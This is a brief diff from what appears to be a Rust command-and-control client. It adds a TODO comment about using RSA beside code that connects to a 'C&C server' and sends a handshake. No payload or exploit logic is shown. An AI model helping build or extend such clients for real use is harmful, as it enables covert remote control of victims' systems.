@@ -25,7 +25,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         println!("Connected to C&C server successfully");
 
         let mut stream = socket::SocketStream::new(connection.unwrap());
-
+        // TODO : Use the RSA :facepalm:
         // send handshake
         println!("Sending handshake");
         stream.stream.write_all(&handshake.as_bytes()).await?;
